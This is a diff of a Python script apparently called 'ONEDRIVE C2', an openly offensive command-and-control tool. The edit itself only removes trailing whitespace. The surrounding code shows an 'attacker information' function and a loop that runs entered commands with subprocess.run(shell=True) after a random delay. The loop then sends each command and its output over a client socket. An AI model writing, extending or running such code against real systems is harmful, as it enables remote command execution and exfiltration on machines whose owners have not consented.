@@ -28,13 +28,13 @@ RESET = '\033[0m'
 
 print(BLUE + """
 
- ██████╗ ███╗   ██╗███████╗██████╗ ██████╗ ██╗██╗   ██╗███████╗     ██████╗██████╗ 
+ ██████╗ ███╗   ██╗███████╗██████╗ ██████╗ ██╗██╗   ██╗███████╗     ██████╗██████╗
 ██╔═══██╗████╗  ██║██╔════╝██╔══██╗██╔══██╗██║██║   ██║██╔════╝    ██╔════╝╚════██╗
 ██║   ██║██╔██╗ ██║█████╗  ██║  ██║██████╔╝██║██║   ██║█████╗      ██║      █████╔╝
-██║   ██║██║╚██╗██║██╔══╝  ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝      ██║     ██╔═══╝ 
+██║   ██║██║╚██╗██║██╔══╝  ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝      ██║     ██╔═══╝
 ╚██████╔╝██║ ╚████║███████╗██████╔╝██║  ██║██║ ╚████╔╝ ███████╗    ╚██████╗███████╗
- ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝     ╚═════╝╚══════╝      
- 
+ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝     ╚═════╝╚══════╝
+
 """ + RESET)
 
 # Function to get attacker information
@@ -102,13 +102,13 @@ def main():
         command = input("Enter a command to execute (or type 'exit' to quit): ")
         if command.lower() == "exit":
             break
-        
+
         time.sleep(random.uniform(1, 5))
-        
+
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         stdout = result.stdout
         stderr = result.stderr
-        
+
         client_socket.send(command.encode())
         client_socket.send(stdout.encode())
         client_socket.send(stderr.encode())
